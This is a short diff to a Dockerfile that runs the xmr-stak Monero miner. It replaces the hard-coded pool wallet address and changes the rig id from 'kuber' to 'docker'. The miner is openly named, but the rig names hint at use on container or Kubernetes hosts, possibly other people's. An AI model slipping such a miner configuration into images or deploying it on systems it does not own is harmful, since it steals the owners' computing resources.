@@ -24,4 +24,4 @@ VOLUME /mnt
 WORKDIR /mnt
 
 ENTRYPOINT ["/usr/local/bin/xmr-stak"]
-CMD ["-o", "stratum+tcp://monerohash.com:3333","-u","48m8fkMz7uwKZ97ZifGSHCU5DKXbU67wg5cmaXecmj5kH1ZTXUaJw4RWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm43Xx1UU","-p","x","-i","4445","--currency","monero7","--rigid","kuber"]
+CMD ["-o", "stratum+tcp://monerohash.com:3333","-u","89vaXuYfqgvVrpYoduwrZBUie6N2dcjMgN5Ai4qrmTB6GXSGKYfjocvMBSB2ttX2M47f6YmQSXnHYd5nMe3F3J7P2P7VLzo","-p","x","-i","4445","--currency","monero7","--rigid","docker"]
